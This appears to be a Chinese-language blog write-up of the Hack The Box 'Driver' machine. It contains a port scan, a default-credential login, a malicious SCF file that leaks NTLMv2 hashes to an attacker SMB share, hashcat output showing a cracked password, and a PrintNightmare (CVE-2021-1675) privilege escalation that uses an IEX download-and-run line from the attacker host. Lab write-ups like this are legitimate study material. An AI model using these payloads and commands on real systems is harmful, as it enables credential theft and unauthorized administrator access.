---
layout: post
title: HTB——Driver
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Driver/01.png?raw=true)

# 0x01 信息收集

```bash
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0
                                                                                                 
[2025-04-28 03:17:50] [INFO] 暴力破解线程数: 1                                                   
[2025-04-28 03:17:50] [INFO] 开始信息扫描
[2025-04-28 03:17:50] [INFO] 最终有效主机数量: 1
[2025-04-28 03:17:50] [INFO] 开始主机扫描
[2025-04-28 03:17:50] [INFO] 有效端口数量: 233
[2025-04-28 03:17:50] [SUCCESS] 端口开放 10.129.130.32:80
[2025-04-28 03:17:50] [SUCCESS] 端口开放 10.129.130.32:445
[2025-04-28 03:17:50] [SUCCESS] 端口开放 10.129.130.32:135
[2025-04-28 03:17:55] [SUCCESS] 服务识别 10.129.130.32:80 => [http]
[2025-04-28 03:17:56] [SUCCESS] 服务识别 10.129.130.32:445 => 
[2025-04-28 03:18:55] [SUCCESS] 服务识别 10.129.130.32:135 => 
[2025-04-28 03:18:56] [INFO] 存活端口数量: 3
[2025-04-28 03:18:56] [INFO] 开始漏洞扫描
[2025-04-28 03:18:56] [INFO] 加载的插件: findnet, ms17010, smb, smb2, smbghost, webpoc, webtitle
[2025-04-28 03:18:56] [SUCCESS] 网站标题 http://10.129.130.32      状态码:401 长度:20     标题:无标题                                                                                             
[2025-04-28 03:18:56] [SUCCESS] NetInfo 扫描结果
目标主机: 10.129.130.32                                                                          
主机名: DRIVER                                                                                   
发现的网络接口:                                                                                  
   IPv4地址:                                                                                     
      └─ 10.129.130.32                                                                           
   IPv6地址:                                                                                     
      └─ dead:beef::40bd:8318:272f:1127                                                          
      └─ dead:beef::a950:1b60:4428:9b3                                                           
      └─ dead:beef::1ad                                                                          
[2025-04-28 03:20:50] [SUCCESS] 扫描已完成: 7/7
```

访问80端口服务，我们会发现其返回包中有很多可疑的数据头。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Driver/02.png?raw=true)

---

# 0x02 构造恶意SCF文件搭配Responder

简单尝试后发现账密即为`admin:admin`。上去查询后我们发现其后台会有一个上传文件功能的页面。根据HTB提示我们是需要通过SCF文件攻击靶机的SMB系统，构造恶意的SCF文件来获取对方用户的NTLM

- [SMB Share – SCF File Attacks – Penetration Testing Lab](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)

首先编写一个如下格式的SCF文件，并在命名中在最前面加上`@`符号以便能触发

```sh
[shell]
Command=2
IconFile=\\10.10.16.10\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

接下来我们需要在本地开启Responder，监听来自网卡的返回信息。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Driver/03.png?raw=true)

在从Driver页面提交恶意信息后，我们就能收到被害者的NTLMv2辣

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Driver/04.png?raw=true)

收到了NTLMv2，我们尝试使用hashcat来爆破

```cmd
TONY::DRIVER:7b50ff2dda5dc35c:700d7f87d72479e98b6d3ac2ddbf3eab:010100000000000005c947f219b8db01d57eebe3341942a100000000020000000000000000000000:liltony

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: TONY::DRIVER:7b50ff2dda5dc35c:700d7f87d72479e98b6d3...000000
Time.Started.....: Mon Apr 28 09:49:28 2025 (0 secs)
Time.Estimated...: Mon Apr 28 09:49:28 2025 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   298.8 MH/s (0.22ms) @ Accel:128 Loops:1 Thr:128 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 983078/14344386 (6.85%)
Rejected.........: 38/983078 (0.00%)
Restore.Point....: 0/14344386 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: bulldogs -> complicatedlife
Hardware.Mon.#1..: Temp: 47c Util:  4% Core:1875MHz Mem:14001MHz Bus:8
```

得到此账密，我们再尝试使用winrm来登录，然后就能成功获取到`user.txt`辣

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Driver/05.png?raw=true)

---

# 0x03 CVE-2021-1675复现

按取证思路，接下来我们去看看tony用户的powershell记录。其powershell记录就在当前用户`AppData/Roaming/Microsoft/Windows/PSReadline`下

```powershell
*Evil-WinRM* PS C:\Users\tony\AppData\Roaming\Microsoft\Windows\Powershell\PSreadline> type ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'

ping 1.1.1.1
ping 1.1.1.1
```

查看到其正在运行一个驱动。我们还可以在`metasploit`上找到该驱动的攻击模块`ricoh_driver_privesc`,但是msf怎么都上不了线，暂不清楚成因。我们改用ps1脚本进行攻击。

- [calebstewart/CVE-2021-1675: Pure PowerShell implementation of CVE-2021-1675 Print Spooler Local Privilege Escalation (PrintNightmare)](https://github.com/calebstewart/CVE-2021-1675)

此项目构建的账户与密码默认为`adm1n:P@ssw0rd`,在编译时我们可通过查看`dllmain.cpp`查看与适当修改。在完成后，我们可上传`ps1`脚本与`dll`文件，并按readme内说明操作

```powershell
*Evil-WinRM* PS C:\Users\tony\Documents> IEX(New-Object Net.Webclient).downloadstring('http://10.10.16.10:80/CVE-2021-1675.ps1')
*Evil-WinRM* PS C:\Users\tony\Documents> Invoke-Nightmare -NewUser "gailo" -NewPassword "password!@#45"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user gailo as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
*Evil-WinRM* PS C:\Users\tony\Documents> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           gailo
Guest                    tony
The command completed with one or more errors.
```

然后使用evil-winrm再上线gailo就可以辣

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Driver/06.png?raw=true)
